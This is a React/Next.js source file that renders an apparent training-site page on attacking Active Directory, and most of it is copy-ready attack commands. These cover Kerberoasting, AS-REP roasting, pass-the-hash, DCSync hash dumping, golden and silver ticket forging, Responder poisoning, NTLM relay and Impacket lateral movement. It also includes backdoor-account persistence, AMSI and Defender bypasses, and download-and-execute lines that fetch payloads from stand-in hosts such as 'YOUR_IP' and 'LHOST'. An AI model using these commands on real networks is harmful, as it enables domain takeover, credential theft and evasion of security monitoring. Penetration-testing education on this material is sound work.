'use client'
import React from 'react'
import Link from 'next/link'

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: '#ff4136', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ color: '#3a0000', fontSize: '0.8rem' }}>//</span> {children}
  </h2>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 600, color: '#cc2200', marginTop: '2rem', marginBottom: '0.75rem' }}>▸ {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
)
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#050000', border: '1px solid #2e0000', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#ff6b6b', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const Alert = ({ type, children }: { type: 'info' | 'warn' | 'danger' | 'tip'; children: React.ReactNode }) => {
  const c: Record<string, [string, string, string]> = {
    info:   ['#ff4136', 'rgba(255,65,54,0.05)',  'NOTE'],
    warn:   ['#ffb347', 'rgba(255,179,71,0.05)', 'WARNING'],
    danger: ['#ff4136', 'rgba(255,65,54,0.08)',  'CRITICAL'],
    tip:    ['#00ff41', 'rgba(0,255,65,0.04)',   'PRO TIP'],
  }
  const [color, bg, label] = c[type]
  return (
    <div style={{ background: bg, borderLeft: `3px solid ${color}`, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.5rem 0', border: `1px solid ${color}33`, borderLeftColor: color }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #2e0000' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#cc2200', fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #1a0000', background: i % 2 === 0 ? 'transparent' : 'rgba(255,65,54,0.02)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a9a8a', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

export default function ActiveDirectoryModule() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <span style={{ color: '#ff4136' }}>ACTIVE DIRECTORY ATTACKS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(255,65,54,0.08)', border: '1px solid rgba(255,65,54,0.3)', borderRadius: '3px', color: '#ff4136', fontSize: '8px', letterSpacing: '0.15em' }}>CONCEPT</span>
          <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.5)', borderRadius: '3px', color: '#ff4136', fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB →</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: '#ff4136', margin: '0.5rem 0', textShadow: '0 0 20px rgba(255,65,54,0.35)' }}>ACTIVE DIRECTORY ATTACKS</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', lineHeight: 1.6 }}>
          AD fundamentals · Enumeration · Kerberoasting · AS-REP Roasting · Pass-the-Hash · DCSync · BloodHound · Lateral movement
        </p>
      </div>

      <div style={{ background: '#0a0000', border: '1px solid #2e0000', borderRadius: '6px', padding: '1.25rem', marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>TABLE OF CONTENTS</div>
        {['01 — Active Directory Architecture', '02 — Enumeration: BloodHound & Manual', '03 — Kerberos: How It Works & Attack Surface', '04 — Kerberoasting', '05 — AS-REP Roasting', '06 — Pass-the-Hash & Pass-the-Ticket', '07 — DCSync — Dumping the Domain', '08 — Golden & Silver Tickets', '09 — LLMNR/NBT-NS Poisoning', '10 — SMB Relay Attacks', '11 — Lateral Movement with Impacket', '12 — Persistence: Creating Backdoor Accounts', '13 — Defence Evasion in AD Environments'].map((item, i) => (
          <div key={i} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', padding: '3px 0', display: 'flex', gap: '8px' }}>
            <span style={{ color: '#3a0000' }}>›</span><span>{item}</span>
          </div>
        ))}
      </div>

      <H2>01 — Active Directory Architecture</H2>
      <P>Active Directory (AD) is Microsoft's directory service for Windows domain networks. It is the backbone of nearly every enterprise environment — authenticating users, managing computers, enforcing group policies, and controlling access to resources. Understanding AD is the highest-leverage skill in enterprise penetration testing.</P>

      <H3>Core Components</H3>
      <Table headers={['COMPONENT', 'FUNCTION', 'ATTACK RELEVANCE']} rows={[
        ['Domain Controller (DC)', 'Authenticates users, stores AD database (NTDS.dit)', 'Primary target — compromise DC = own the domain'],
        ['NTDS.dit', 'The AD database — contains all user password hashes', 'Dump with DCSync or physical access'],
        ['LDAP', 'Protocol for querying AD objects', 'Enumerate users, groups, computers, policies'],
        ['Kerberos', 'Authentication protocol — tickets instead of passwords', 'Kerberoasting, Pass-the-Ticket, Golden Ticket'],
        ['NTLM', 'Older auth protocol — still widely used', 'Pass-the-Hash, NTLM relay, Responder'],
        ['Group Policy (GPO)', 'Centrally push configs to machines', 'Abuse writable GPOs to push malicious configs'],
        ['Service Principal Names (SPNs)', 'Identifiers for services in Kerberos', 'Kerberoasting — request TGS for any SPN'],
        ['Domain Trust', 'Relationship between domains allowing cross-domain auth', 'Trust abuse for cross-domain privilege escalation'],
      ]} />

      <H3>Key AD Objects</H3>
      <Pre label="// POWERSHELL — BASIC AD ENUMERATION (no tools needed)">{`# Get domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# List all users
net user /domain

# List all groups
net group /domain

# List domain admins
net group "Domain Admins" /domain

# Current user's privileges
whoami /all

# Computer's domain
systeminfo | findstr /i "domain"

# Enumerate with PowerView (load first):
IEX(New-Object Net.WebClient).downloadString('http://YOUR_IP/PowerView.ps1')
Get-Domain
Get-DomainUser
Get-DomainGroup "Domain Admins" | select members
Get-DomainComputer | select name,operatingsystem
Get-DomainGPO | select displayname`}</Pre>

      <H2>02 — Enumeration: BloodHound & Manual</H2>
      <P>BloodHound is the single most powerful Active Directory enumeration tool. It maps the entire domain into a graph database showing attack paths — visually revealing how an attacker can move from a compromised user to Domain Admin via relationships that are invisible in manual enumeration.</P>

      <H3>BloodHound Setup</H3>
      <Pre label="// BLOODHOUND — COMPLETE SETUP">{`# Install BloodHound (Kali/Debian)
sudo apt install bloodhound

# Install Neo4j (required database)
sudo apt install neo4j
sudo neo4j start
# Open: http://localhost:7474
# Default: neo4j/neo4j → change password on first login

# Start BloodHound
bloodhound
# Enter Neo4j credentials

# Collect data with SharpHound (run on target, requires domain access):
# Download from: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# From compromised Windows host in domain:
.\SharpHound.exe -c All
# Creates: 20240101120000_BloodHound.zip

# From Kali (with credentials):
python3 bloodhound-python -u USER -p PASS -d domain.local -ns DC_IP -c All
# pip install bloodhound

# Upload ZIP to BloodHound → drag and drop into interface
# Then query:`}</Pre>

      <Pre label="// BLOODHOUND — HIGH-VALUE QUERIES">{`# In BloodHound interface, go to Queries tab:

# 1. Find all Domain Admins
MATCH (n:Group) WHERE n.name =~ "(?i).*domain admins.*" RETURN n

# 2. Shortest path to Domain Admin from owned user
# Right-click your user → Mark as Owned
# Analysis → Find Shortest Paths to Domain Admins

# 3. Find all Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

# 4. Find users with AS-REP Roasting vulnerability
MATCH (u:User {dontreqpreauth: true}) RETURN u

# 5. Find computers where Domain Users can RDP
MATCH p=(g:Group)-[:CanRDP]->(c:Computer) WHERE g.name =~ "(?i).*domain users.*" RETURN p

# 6. Find all ACL attack paths
Analysis → Find Principals with DCSync Rights
Analysis → Find Computers with Unsupported Operating Systems`}</Pre>

      <H3>Manual LDAP Enumeration</H3>
      <Pre label="// LDAP ENUMERATION — FROM KALI WITH CREDENTIALS">{`# ldapsearch — query AD via LDAP
sudo apt install ldap-utils

# Enumerate all users:
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "password" \
  -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName

# Find users with SPN (Kerberoastable):
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "password" \
  -b "dc=domain,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Find users with no preauth required (AS-REP Roastable):
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "password" \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Enumerate domain admins:
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "password" \
  -b "dc=domain,dc=local" \
  "(&(objectClass=group)(cn=Domain Admins))" member`}</Pre>

      <H2>03 — Kerberos: How It Works & Attack Surface</H2>
      <Pre label="// KERBEROS AUTHENTICATION FLOW">{`# Kerberos uses tickets — no passwords sent over network

CLIENT                    KDC (Key Distribution Center)              SERVICE
  │                              │                                       │
  │── AS-REQ ─────────────────►  │  (client requests TGT)               │
  │   Contains: username,         │                                       │
  │   timestamp encrypted        │                                       │
  │   with client's NT hash      │                                       │
  │                              │                                       │
  │◄─ AS-REP ──────────────────  │  (KDC issues Ticket Granting Ticket)  │
  │   Contains: TGT encrypted     │                                       │
  │   with krbtgt hash           │                                       │
  │                              │                                       │
  │── TGS-REQ ─────────────────► │  (client wants to access a service)  │
  │   Contains: TGT + SPN        │                                       │
  │                              │                                       │
  │◄─ TGS-REP ─────────────────  │  (KDC issues service ticket)          │
  │   TGS encrypted with         │                                       │
  │   SERVICE account hash ◄──── │ ← THIS IS KERBEROASTING TARGET       │
  │                              │                                       │
  │── AP-REQ ──────────────────────────────────────────────────────────► │
  │   Contains: TGS              │                                       │
  │                              │                   ◄─ AP-REP ──────── │

# ATTACK SURFACES:
# AS-REP: if user has no preauth → KDC sends TGT without verifying → crack offline
# TGS: ANY domain user can request TGS for ANY SPN → encrypted with service hash → crack
# TGT: if krbtgt hash known → forge ANY TGT → Golden Ticket`}</Pre>

      <H2>04 — Kerberoasting</H2>
      <P>Any domain user can request a Ticket Granting Service (TGS) for any Service Principal Name (SPN) in the domain. The TGS is encrypted with the service account's NTLM hash — which can be cracked offline. This requires only a valid domain user account.</P>

      <Pre label="// KERBEROASTING — FULL ATTACK CHAIN">{`# Step 1: Find Kerberoastable accounts (have SPNs)
# From Windows (with PowerView):
Get-DomainUser -SPN | select name,serviceprincipalname

# From Kali (with impacket):
pip install impacket
python3 GetUserSPNs.py domain.local/user:password -dc-ip DC_IP

# Step 2: Request TGS tickets for all SPNs
python3 GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request
# Saves hashes to file or displays them

# Output looks like:
# $krb5tgs$23$*svc_sql$DOMAIN.LOCAL$domain.local/svc_sql*$a3b...

# Step 3: Crack the TGS hash offline
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -r rules/best64.rule

# From Windows (no extra tools needed):
# rubeus.exe kerberoast /outfile:hashes.txt

# Why this works:
# - Any domain user can request TGS for any SPN
# - TGS encrypted with SERVICE ACCOUNT hash (not DC hash)
# - Service accounts often have weak passwords (never expired)
# - Entirely offline — no brute force against DC

# High value targets:
# svc_sql, svc_web, svc_backup, MSSQLSvc, TERMSRV
# These often have domain privileges + weak passwords`}</Pre>

      <H2>05 — AS-REP Roasting</H2>
      <P>If a user account has "Do not require Kerberos preauthentication" set, the KDC will return an AS-REP encrypted with the user's hash without verifying the requester's identity. This can be requested by anyone — even unauthenticated.</P>

      <Pre label="// AS-REP ROASTING">{`# Step 1: Find AS-REP Roastable users
# (userAccountControl includes DONT_REQ_PREAUTH flag)

# From Kali (unauthenticated — no credentials needed if you have usernames):
python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip DC_IP

# With credentials (enumerate and attack):
python3 GetNPUsers.py domain.local/user:password -request -format hashcat -dc-ip DC_IP

# From Windows:
# rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Step 2: Crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Hash format: $krb5asrep$23$user@domain.local:...

# Why this matters:
# - No credentials needed to attack (just usernames)
# - Affected users have DONT_REQ_PREAUTH flag set
# - Rare but extremely high value when found
# - Check for it on ALL accounts during enum`}</Pre>

      <H2>06 — Pass-the-Hash & Pass-the-Ticket</H2>
      <Pre label="// PASS-THE-HASH (PTH) — USE NTLM HASH WITHOUT CRACKING">{`# NTLM authentication sends the hash directly — no need to know plaintext

# CrackMapExec PTH — test credentials across network:
cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH

# Execute commands via PTH:
cme smb 192.168.1.100 -u Administrator -H NTLM_HASH -x "whoami"

# PSExec via PTH (gives shell):
python3 psexec.py -hashes :NTLM_HASH administrator@192.168.1.100

# WMIExec via PTH (stealthier):
python3 wmiexec.py -hashes :NTLM_HASH administrator@192.168.1.100

# SMBExec (no file drop):
python3 smbexec.py -hashes :NTLM_HASH administrator@192.168.1.100

# Get NTLM hash sources:
# 1. Mimikatz: sekurlsa::logonpasswords
# 2. Hashdump via Meterpreter
# 3. SAM dump: reg save HKLM\SAM sam.bak + secretsdump.py
# 4. NTDS.dit dump via DCSync

# Impacket secretsdump — dump hashes remotely if you have admin:
python3 secretsdump.py domain/user:pass@DC_IP
python3 secretsdump.py -hashes :NTLM_HASH domain/admin@DC_IP`}</Pre>

      <Pre label="// PASS-THE-TICKET (PTT) — USE KERBEROS TICKET">{`# Import/export Kerberos tickets for lateral movement

# Mimikatz — export all tickets from memory:
sekurlsa::tickets /export
# Creates .kirbi files for each ticket

# Import a ticket:
kerberos::ptt ticket.kirbi

# Rubeus — list tickets:
rubeus.exe triage

# Rubeus — export tickets:
rubeus.exe dump /luid:0x3e4 /service:krbtgt

# Rubeus — import and use ticket:
rubeus.exe ptt /ticket:base64_ticket

# Linux — use ticket with impacket:
export KRB5CCNAME=/path/to/ticket.ccache
python3 psexec.py -k -no-pass domain/admin@server.domain.local`}</Pre>

      <H2>07 — DCSync: Dumping the Domain</H2>
      <P>DCSync abuses the replication rights in Active Directory. Domain Controllers replicate data between each other using the Directory Replication Service (DRS) protocol. Any account with replication rights (usually only DCs and Domain Admins) can request this data — including password hashes for ALL users including krbtgt.</P>

      <Pre label="// DCSYNC — DUMP ALL DOMAIN HASHES">{`# Requirements: 
# Account must have DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
# Default: Domain Admins, Enterprise Admins, SYSTEM on DCs

# Mimikatz DCSync:
lsadump::dcsync /user:krbtgt                  # dump krbtgt hash
lsadump::dcsync /user:Administrator           # dump admin hash
lsadump::dcsync /domain:domain.local /all     # dump ALL hashes

# Impacket secretsdump (from Kali — no need for Mimikatz):
python3 secretsdump.py domain.local/admin:password@DC_IP
python3 secretsdump.py -hashes :NTLM_HASH domain.local/admin@DC_IP

# Output:
# [*] Dumping Domain Credentials (domain/uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Why krbtgt hash is the holy grail:
# → Can create Golden Tickets (forge ANY TGT for ANY user, any lifetime)
# → Golden Ticket survives password changes until krbtgt reset twice
# → Domain-level persistence that lasts months/years`}</Pre>

      <H2>08 — Golden & Silver Tickets</H2>
      <Pre label="// GOLDEN TICKET — FORGE ANY TGT WITH KRBTGT HASH">{`# Requirements: krbtgt hash (from DCSync)
# Result: forge TGT for ANY user, ANY group, ANY lifetime

# Collect needed info:
# krbtgt hash: from DCSync
# Domain SID: whoami /user → remove last -RID
# Domain name: domain.local

# Mimikatz — create Golden Ticket:
kerberos::golden /user:FakeAdmin /domain:domain.local \
  /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# This creates a TGT for a user that doesn't exist
# with Domain Admin group membership
# valid for 10 years by default

# Impacket — create Golden Ticket:
python3 ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-... \
  -domain domain.local FakeAdmin

export KRB5CCNAME=FakeAdmin.ccache
python3 psexec.py -k -no-pass domain.local/FakeAdmin@dc.domain.local`}</Pre>

      <Pre label="// SILVER TICKET — FORGE TGS FOR SPECIFIC SERVICE">{`# Silver Ticket = forge TGS using SERVICE ACCOUNT hash
# More stealthy than Golden (doesn't touch DC)
# Can forge tickets for: CIFS, HOST, HTTP, LDAP, MSSQL

# Requires: service account NTLM hash, domain SID, service SPN

# Mimikatz — Silver Ticket for CIFS (file shares):
kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /target:fileserver.domain.local \
  /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt

# Now access file shares on fileserver as Administrator:
dir \\fileserver\c$`}</Pre>

      <H2>09 — LLMNR/NBT-NS Poisoning</H2>
      <Pre label="// RESPONDER — CAPTURE NTLM HASHES ON THE NETWORK">{`# When a Windows host can't resolve a name via DNS,
# it falls back to LLMNR/NBT-NS broadcast queries.
# Responder answers these, claiming to be the target,
# and Windows sends NTLM authentication.

# Start Responder (capture mode):
sudo python3 Responder.py -I eth0 -rdwv

# Flags:
# -r  Enable answers for MSSQL
# -d  Enable DHCP poisoning
# -w  Start WPAD rogue server (captures proxy auth)

# Captured hashes saved to:
ls /usr/share/responder/logs/

# Crack NTLMv2 hashes:
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# Analysis mode (passive — no poisoning):
sudo python3 Responder.py -I eth0 -A

# OPSEC: Responder is VERY noisy
# Every analyst on the network will see broadcast answers
# Use carefully in red team engagements`}</Pre>

      <H2>10 — SMB Relay Attacks</H2>
      <Pre label="// NTLM RELAY — RELAY CAPTURED AUTH TO ANOTHER HOST">{`# Instead of cracking the NTLM hash, RELAY it to another host
# Requirements: SMB signing must be DISABLED on target

# Step 1: Check which hosts have SMB signing disabled:
cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Step 2: Disable SMB and HTTP in Responder (we're relaying, not capturing):
nano /usr/share/responder/Responder.conf
# SMB = Off
# HTTP = Off

# Step 3: Start ntlmrelayx targeting vulnerable hosts:
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support

# Step 4: Start Responder:
sudo python3 Responder.py -I eth0 -rdwv

# When a machine tries to authenticate to us,
# we relay to targets in relay_targets.txt
# If relayed user is local admin → get SAM dump automatically

# Advanced: relay to get shell:
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support -i
# Opens interactive shell on successful relay

# Relay to LDAP (requires signing disabled on DC — rare):
python3 ntlmrelayx.py -t ldap://DC_IP --delegate-access`}</Pre>

      <H2>11 — Lateral Movement with Impacket</H2>
      <Pre label="// IMPACKET SUITE — COMPLETE WINDOWS REMOTE EXECUTION">{`# Install impacket:
pip install impacket
# or: git clone https://github.com/fortra/impacket && pip install -e .

# PSExec — creates and runs service (leaves artifacts):
python3 psexec.py domain.local/admin:password@TARGET
python3 psexec.py -hashes :NTLM_HASH domain.local/admin@TARGET

# WMIExec — uses WMI (no service created, stealthier):
python3 wmiexec.py domain.local/admin:password@TARGET
python3 wmiexec.py -hashes :NTLM_HASH domain.local/admin@TARGET "whoami"

# SMBExec — executes via SMB service (no file drop):
python3 smbexec.py domain.local/admin:password@TARGET

# ATExec — uses Windows Task Scheduler:
python3 atexec.py domain.local/admin:password@TARGET "command"

# SecretsDump — dump credentials remotely:
python3 secretsdump.py domain.local/admin:password@TARGET

# GetST — request service ticket for Kerberos delegation:
python3 getST.py -spn cifs/target.domain.local domain.local/user:pass

# Ticketer — create Golden/Silver tickets:
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain domain.local user

# Scan for SMB vulnerabilities:
python3 smbclient.py domain.local/admin:pass@TARGET
shares  # list shares
use C$  # connect to C drive
ls      # list files`}</Pre>

      <H2>12 — Persistence: Backdoor Accounts</H2>
      <Pre label="// CREATING PERSISTENCE IN AD ENVIRONMENTS">{`# Add backdoor local admin (on compromised host):
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# Add domain user (requires Domain Admin):
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain

# Create scheduled task (persistence on host):
schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle Hidden -c 'IEX(...)'" \
  /sc onlogon /ru SYSTEM

# Modify existing service binary path:
sc config ServiceName binpath= "C:\backdoor.exe"

# Add registry run key:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
  /v Update /t REG_SZ /d "C:\backdoor.exe"

# WMI subscription (fileless persistence):
# Runs command when event occurs (e.g. every minute)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter ...

# DCSync rights without Domain Admin (stealthy persistence):
# Add replication rights to a regular user → can run DCSync forever
# Without being in Domain Admins group
Add-ObjectAcl -TargetDistinguishedName "DC=domain,DC=local" \
  -PrincipalIdentity backdoor \
  -Rights DCSync`}</Pre>

      <H2>13 — Defence Evasion in AD Environments</H2>
      <Pre label="// BYPASS COMMON DEFENCES">{`# AMSI Bypass (blocks PowerShell script scanning):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Or:
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ([TYpE]( "{1}{0}"-F'F','rE' ) )

# AMSI bypass (one-liner):
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b.GetFields('NonPublic,Static');Foreach($d in $c) {if ($d.Name -like "*Context") {$d.SetValue($null,[IntPtr]32)}}}};

# PowerShell execution policy bypass:
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted

# CLM bypass (Constrained Language Mode):
# Run PowerShell in a COM object
$sh = New-Object -ComObject WScript.Shell
$sh.Run("powershell -ep bypass -c '...'")

# Defender exclusion (if admin):
Add-MpPreference -ExclusionPath "C:\Users\Public\"
Set-MpPreference -DisableRealtimeMonitoring $true

# Use signed LOLBins for execution:
# regsvr32, mshta, wscript, cscript, certutil, msiexec
certutil -decode encoded.txt payload.exe
mshta javascript:a=(GetObject('script:http://LHOST/payload.sct')).Exec();close();`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a2e1e' }}>
        <div style={{ background: 'rgba(255,65,54,0.04)', border: '1px solid rgba(255,65,54,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a1a1a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', color: '#ff4136', marginBottom: '0.5rem', fontWeight: 600 }}>MOD-05 Interactive Lab</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', marginBottom: '1.5rem' }}>5 steps &middot; 145 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', color: '#ff4136', padding: '12px 32px', border: '1px solid rgba(255,65,54,0.6)', borderRadius: '6px', background: 'rgba(255,65,54,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(255,65,54,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>&#8592; MOD-04: OFFENSIVE</Link>
          <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>MOD-06: WEB ATTACKS &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
